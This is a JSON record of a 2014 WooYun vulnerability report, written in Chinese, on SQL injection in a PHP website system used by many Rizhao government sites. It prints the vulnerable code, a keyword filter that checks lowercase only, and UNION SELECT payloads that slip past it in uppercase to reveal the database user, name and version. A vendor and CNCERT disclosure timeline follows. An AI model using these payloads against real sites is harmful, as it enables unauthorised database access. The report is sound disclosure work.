{"id": 58346, "wybug_id": "wooyun-2014-051505", "wybug_title": "某政府网站通用系统存在SQL漏洞", "wybug_corp": "日照至信信息科技有限公司", "wybug_author": "宇少", "wybug_date": "2014-02-24 10:47", "wybug_open_date": "2014-05-25 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向公众公开  简要描述： 日照至信信息科技有限公司政府网站存在通用注入漏洞，函数没过滤完全。 详细说明：  日照至信信息科技有限公司，专业提供政府，企业，地产，文艺网站开发商。日照市很多政府都用的这套系统具体案例可以参照：http://www.zxxxkj.com/cgal.php     漏洞证明：  \nmenuList.php 文件 15至18行<?php\t$menuId=$myFunc->inject_check($_GET['menuId']); //获取GET参数，通过inject_check函数进行过滤，我们跟踪这个函数\t$sql='select * from menu_info where id='.$menuId.'';\t\t$info=$mysql->q2a($sql);\t?>\n\ninject_check 过滤函数代码：function inject_check($str) { //防注入函数开始\t\t$check=preg_match('/select|order|insert|update|eval|document|delete|injection|jection|link|\\'|\\%|\\/\\*|\\*|\\.\\.\\/|\\.\\/|\\,|\\.|--|\\\"|and|or|from|union|into|load_file|outfile|<script>/',$str);\t\t if($check){\t\t\techo \"<script>alert('输入非法内容！！');window.history.go(-1);</script>\";\t\t\texit();\t\t }else{\t\t\treturn $str;\t\t }\t}\t/**//过滤了注入关键词小写，大写就可以突破！\n注入报错:http://localhost/menuList.php?menuId=2'\n\nhttp://localhost/menuList.php?menuId=2 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4,5,6,7,8,9/*\n\n大写成功突破：http://localhost/menuList.php?menuId=2 and 1=2 UNION SELECT 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4,5,6,7,8,9/*\n\n查询数据库里面内容：\n\n   修复方案：  #1,加强函数的过滤   版权声明：转载请注明来源 宇少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-01 11:19 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给山东分中心，由其协调生产厂商和网站案例单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}